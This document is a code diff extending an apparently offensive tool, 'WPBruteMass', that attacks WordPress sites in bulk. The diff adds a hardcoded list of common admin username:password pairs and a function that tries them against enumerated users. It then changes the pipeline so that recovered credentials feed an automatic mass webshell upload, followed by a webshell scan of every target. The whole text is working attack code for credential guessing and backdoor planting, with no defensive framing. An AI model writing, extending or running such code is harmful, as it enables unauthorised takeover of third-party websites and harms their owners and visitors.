@@ -116,6 +116,16 @@ DEFAULT_SHELL_NAMES = [
 # WordPress login paths for validation
 WP_PATHS = ["/wp-login.php", "/wp-admin/", "/wp-admin/admin-ajax.php", "/xmlrpc.php"]
 
+# Common username:password pairs for quick test (admin finder)
+DEFAULT_QUICK_PAIRS = [
+    "admin:admin", "admin:admin1234", "admin:123456", "admin:password",
+    "admin:12345678", "admin:12345", "admin:admin123", "user:user",
+    "user:password", "user:123456", "admin:123456789", "admin:1234",
+    "root:root", "root:123456", "administrator:administrator",
+    "administrator:password", "wp:wp", "test:test", "editor:editor",
+    "author:author", "admin:passw0rd", "admin:Password123"
+]
+
 # ─── Globals ──────────────────────────────────────────────────────────────────
 
 proxies_list = []
@@ -373,6 +383,68 @@ def enumerate_usernames(target):
         users = ["admin"]
     
     return users
+
+# ─── Admin Finder: Quick common password test ─────────────────────────────────
+
+def quick_common_test(target, users, quick_pairs):
+    """
+    Try common username:password pairs against a target.
+    Returns a cred dict if found, None otherwise.
+    """
+    base_url = normalize_url(target)
+    log(f"  [Quick Test] Trying {len(quick_pairs)} common user:pass combos on {base_url}")
+    
+    for pair in quick_pairs:
+        if ':' not in pair:
+            continue
+        username, password = pair.split(':', 1)
+        # Also try each enumerated username with each common password if the pair list doesn't contain them
+        # But first try the specific pairs
+        success, cookies = try_login(base_url, username, password)
+        if success:
+            msg = f"CREDS FOUND (quick test): {base_url} | user:{username} pass:{password}"
+            log(msg)
+            write_to_file(SUCCESS_LOG, msg)
+            with lock:
+                found_creds.append({
+                    "url": base_url,
+                    "username": username,
+                    "password": password,
+                    "cookies": cookies,
+                    "method": "quick_test"
+                })
+            return {
+                "url": base_url,
+                "username": username,
+                "password": password,
+                "cookies": cookies,
+                "method": "quick_test"
+            }
+        
+        # Also try the password with any enumerated usernames that aren't already covered
+        for user in users:
+            if user != username:
+                success2, cookies2 = try_login(base_url, user, password)
+                if success2:
+                    msg = f"CREDS FOUND (quick test): {base_url} | user:{user} pass:{password}"
+                    log(msg)
+                    write_to_file(SUCCESS_LOG, msg)
+                    with lock:
+                        found_creds.append({
+                            "url": base_url,
+                            "username": user,
+                            "password": password,
+                            "cookies": cookies2,
+                            "method": "quick_test"
+                        })
+                    return {
+                        "url": base_url,
+                        "username": user,
+                        "password": password,
+                        "cookies": cookies2,
+                        "method": "quick_test"
+                    }
+    return None
 
 # ─── STEP 3: Bruteforce Attack ──────────────────────────────────────────────
 
@@ -849,7 +921,7 @@ def scan_webshell(target):
 
 # ─── Core Pipeline Execution ─────────────────────────────────────────────────
 
-def pipeline_attack(targets, wordlist, shell_scan_only=False):
+def pipeline_attack(targets, wordlist, quick_pairs, shell_scan_only=False):
     """Execute full attack pipeline on all targets."""
     if not targets:
         log("[!] No targets provided.")
@@ -877,6 +949,10 @@ def pipeline_attack(targets, wordlist, shell_scan_only=False):
             # Even non-WP targets can have shells
             pass
         else:
+            # Still run shell scanner on original targets as requested
+            log(f"\n[STEP 5] Webshell Scanner Mode (no WP targets, but scanning anyway)")
+            for target in targets:
+                scan_webshell(target)
             return
     
     log(f"\n[STEP 2] Username Enumeration on {len(confirmed_targets)} confirmed targets")
@@ -897,24 +973,43 @@ def pipeline_attack(targets, wordlist, shell_scan_only=False):
             scan_webshell(target)
         return
     
-    # STEP 3: Bruteforce
+    # ----- Admin Finder: Quick common password test -----
+    log(f"\n[ADMIN FINDER] Quick common password test on {len(confirmed_targets)} targets")
+    quick_creds = {}
+    for target in confirmed_targets:
+        users = target_users.get(target, ["admin"])
+        cred = quick_common_test(target, users, quick_pairs)
+        if cred:
+            quick_creds[target] = cred
+            # Remove target from list that still need full bruteforce
+            # We'll skip full bruteforce for this target
+    # -----------------------------------------------------
+    
+    # STEP 3: Bruteforce (skip targets that already have creds from quick test)
     log(f"\n[STEP 3] Bruteforce Attack")
-    successful_creds = {}
+    successful_creds = dict(quick_creds)  # start with quick creds
     
     for target in confirmed_targets:
+        if target in successful_creds:
+            log(f"  [*] Skipping bruteforce for {target} (already found credentials)")
+            continue
         if target in target_users:
             cred = bruteforce_target(target, target_users[target], wordlist)
             if cred:
                 successful_creds[target] = cred
     
     if not successful_creds:
-        log("[!] No credentials found. Stopping pipeline.")
-        return
+        log("[!] No credentials found.")
+    else:
+        # STEP 4: Shell Upload (only if credentials found)
+        log(f"\n[STEP 4] Auto Mass Shell Upload")
+        for target, cred in successful_creds.items():
+            attempt_shell_upload(target, cred)
     
-    # STEP 4: Shell Upload
-    log(f"\n[STEP 4] Auto Mass Shell Upload")
-    for target, cred in successful_creds.items():
-        attempt_shell_upload(target, cred)
+    # STEP 5: Webshell Scanner - always run after bruteforce
+    log(f"\n[STEP 5] Webshell Scanner")
+    for target in targets:   # scan all original targets, not just confirmed WP
+        scan_webshell(target)
     
     # Final summary
     log("\n" + "=" * 60)
@@ -922,7 +1017,7 @@ def pipeline_attack(targets, wordlist, shell_scan_only=False):
     log(f"  Targets processed: {len(targets)}")
     log(f"  WordPress confirmed: {len(confirmed_targets)}")
     log(f"  Credentials found: {len(successful_creds)}")
-    log(f"  Shells uploaded: {len(found_shells_list)}")
+    log(f"  Shells uploaded/found: {len(found_shells_list)}")
     log(f"  Output files:")
     log(f"    - {OUTPUT_FILE}")
     log(f"    - {SUCCESS_LOG}")
@@ -1003,6 +1098,7 @@ def main():
     parser.add_argument("--scan-only", action="store_true", help="Webshell scanner mode only (skip validation/bruteforce)")
     parser.add_argument("--timeout", type=int, default=TIMEOUT, help=f"Request timeout (default: {TIMEOUT}s)")
     parser.add_argument("-o", "--output", default=OUTPUT_FILE, help=f"Output file (default: {OUTPUT_FILE})")
+    parser.add_argument("--quick-passwords", help="File with username:password pairs for quick test (one per line)")
     
     args = parser.parse_args()
     
@@ -1016,6 +1112,13 @@ def main():
     proxies_list = load_file_lines(args.proxy_file if os.path.exists(args.proxy_file) else PROXY_FILE)
     user_agents = load_file_lines(args.user_agent_file if os.path.exists(args.user_agent_file) else USER_AGENT_FILE)
     shell_dict = load_file_lines(args.shell_dict if os.path.exists(args.shell_dict) else SHELL_DICT_FILE, DEFAULT_SHELL_NAMES)
+    
+    # Load quick password pairs
+    quick_pairs = DEFAULT_QUICK_PAIRS
+    if args.quick_passwords and os.path.exists(args.quick_passwords):
+        quick_pairs = load_file_lines(args.quick_passwords)
+        if not quick_pairs:
+            quick_pairs = DEFAULT_QUICK_PAIRS
     
     # Load wordlist
     wordlist = load_file_lines(args.wordlist if os.path.exists(args.wordlist) else WORDLIST_FILE)
@@ -1032,6 +1135,7 @@ def main():
     log(f"[*] WPBruteMass v{VERSION} initialized")
     log(f"[*] Target: {args.target}")
     log(f"[*] Wordlist: {len(wordlist)} passwords")
+    log(f"[*] Quick test pairs: {len(quick_pairs)}")
     log(f"[*] Proxies: {len(proxies_list)}")
     log(f"[*] Shell dictionary: {len(shell_dict)} entries")
     
@@ -1045,7 +1149,7 @@ def main():
         for target in targets:
             scan_webshell(target)
     else:
-        pipeline_attack(targets, wordlist)
+        pipeline_attack(targets, wordlist, quick_pairs)
     
     log("[*] WPBruteMass completed.")
 
